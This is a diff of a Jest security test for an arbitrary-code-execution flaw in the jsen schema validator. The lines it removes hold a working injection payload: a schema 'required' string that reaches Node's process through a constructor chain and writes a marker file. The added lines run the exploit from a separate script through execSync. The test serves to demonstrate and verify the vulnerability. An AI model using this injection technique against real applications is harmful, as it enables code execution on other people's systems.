@@ -1,28 +1,14 @@
 test("Arbitrary code execution in jsen", () => {
   expect.assertions(2);
   const fs = require("fs");
-  const jsen = require("jsen");
+  const { execSync } = require("child_process")
+  const sleep = require("sleep");
   const path = "./jsen";
   file_exist = fs.existsSync(path);
   expect(file_exist).toBe(false);
-  let schema = JSON.parse(
-    JSON.stringify({
-      type: "object",
-      properties: { username: { type: "string" } },
-      required: [
-        "\\" +
-          this.constructor
-            .constructor(`return process`)()
-            .mainModule.require(`fs`)
-            .writeFileSync(`jsen`, ``) +
-          "",
-      ],
-    })
-  );
-  try {
-    const validate = jsen(schema);
-    validate({});
-  } catch (e) {}
+  // For whatever reason, this doesn't actually work when run directly under jest
+  execSync(`node ${__dirname}/code.js`)
+  sleep.sleep(2)
   file_exist = fs.existsSync(path);
   expect(file_exist).toBe(true);
   fs.unlink(path, function (err) {});
